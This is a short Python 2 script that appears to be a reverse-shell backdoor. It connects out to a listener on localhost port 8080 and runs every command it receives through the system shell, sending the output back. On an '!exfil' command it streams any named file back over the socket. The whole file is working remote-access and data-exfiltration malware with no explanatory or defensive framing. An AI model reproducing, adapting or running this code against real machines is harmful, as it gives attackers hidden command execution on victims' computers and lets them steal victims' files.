#!/usr/bin/python

import socket
import subprocess
import os





def transfer(s,file):
	if os.path.exists(file):
		f = open(file, 'rb')
		packet = f.read(1024)
		while packet != '':
			s.send(packet)
			packet = f.read(1024)
		s.send('!EXFIL')
		f.close()

	else:
		s.send('File not found')





def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('localhost', 8080))

	while True:
		cmd = s.recv(1024)

		if '!quit' in cmd:
			s.close()
			break

		elif '!exfil' in cmd:
			exfil,file = cmd.split("*")

			try:
				transfer(s,file)
			except Exception,e:
				s.send(str(e))
				pass

		else:
			CMD = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			s.send(CMD.stdout.read())
			s.send(CMD.stderr.read())





def main():
	connect()





main()
